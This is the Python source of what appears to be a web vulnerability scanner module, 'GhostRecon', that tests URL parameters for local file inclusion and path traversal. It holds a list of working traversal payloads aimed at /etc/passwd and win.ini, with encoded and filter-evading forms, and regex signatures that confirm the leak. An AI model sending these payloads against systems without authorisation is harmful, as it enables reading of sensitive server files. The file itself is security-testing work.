"""
LFIModule — GhostRecon module.
Detects Local File Inclusion and Path Traversal vulnerabilities.
"""
import time
import urllib.parse
import re

try:
    import requests
except ImportError:
    requests = None

from modules import BaseModule


class LFIModule(BaseModule):
    NAME = "LFI / Path Traversal"

    LFI_PARAMS = [
        "file", "path", "page", "include", "doc", "folder", "template", 
        "view", "content", "cat", "dir", "action", "board", "date", 
        "detail", "download", "prefix", "inc", "locate", "show", "site", 
        "type", "val", "name"
    ]

    PAYLOADS = [
        "../../../../../../../../../../etc/passwd",
        "/etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//....//etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "C:\\Windows\\win.ini",
    ]

    SIGNATURES = [
        (r"root:x:0:0:", "Linux /etc/passwd"),
        (r"bin:x:1:1:", "Linux /etc/passwd"),
        (r"daemon:x:", "Linux /etc/passwd"),
        (r"\[extensions\]", "Windows win.ini"),
        (r"\[fonts\]", "Windows win.ini"),
        (r"; for 16-bit app support", "Windows win.ini")
    ]

    def run(self):
        self.ui.section("LFI — Local File Inclusion / Path Traversal Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        s = self._session()
        found = 0

        endpoints = [self.base_url] + self.ctx.get("endpoints", [])[:30]
        test_params = set(self.LFI_PARAMS)
        for ep in self.ctx.get("discovered_params", []):
            if isinstance(ep, dict):
                test_params.update(ep.get("params", {}).keys())

        for endpoint in endpoints:
            for param in test_params:
                # Get baseline to avoid false positives (e.g., page naturally containing "[fonts]")
                baseline_url = f"{endpoint}?{param}=ghostrecon_baseline_test"
                try:
                    baseline_resp = s.get(baseline_url, timeout=self.timeout)
                    baseline_text = baseline_resp.text
                except Exception:
                    baseline_text = ""

                for payload in self.PAYLOADS:
                    url = f"{endpoint}?{param}={urllib.parse.quote(payload)}"
                    try:
                        resp = s.get(url, timeout=self.timeout)

                        for sig_pattern, sig_desc in self.SIGNATURES:
                            if re.search(sig_pattern, resp.text, re.IGNORECASE):
                                # Verify signature does not exist in baseline
                                if re.search(sig_pattern, baseline_text, re.IGNORECASE):
                                    continue

                                self.db.add(
                                    title=f"LFI / Path Traversal via '{param}'",
                                    severity="critical", url=endpoint, module=self.NAME,
                                    description=(
                                        f"Parameter '{param}' is vulnerable to Path Traversal/LFI. "
                                        f"Payload '{payload}' resulted in the disclosure of {sig_desc}. "
                                        "This allows an attacker to read arbitrary files on the server."
                                    ),
                                    remediation=(
                                        "Do not pass user input directly to filesystem APIs. "
                                        "Validate input against a strict whitelist of permitted files. "
                                        "Use secure APIs like os.path.realpath() to ensure the resolved "
                                        "path is within the expected directory."
                                    ),
                                    cvss="7.5",
                                    confidence="CONFIRMED",
                                    confidence_score=95,
                                    validation_steps=["file_content_matched", "baseline_compared"],
                                    evidence=[f"Payload: {payload}", f"Matched Signature: {sig_desc}"]
                                )
                                self.ui.find("critical", f"LFI via '{param}' ({sig_desc})", endpoint)
                                found += 1
                                break # One signature is enough per payload
                        
                        if found > 0:
                            break # Move to next param if we found a vuln here

                        time.sleep(self.delay)
                    except Exception:
                        continue
                if found > 10:
                    break
            if found > 10:
                break

        if found == 0:
            self.ui.info("No LFI/Path Traversal vulnerabilities detected.")
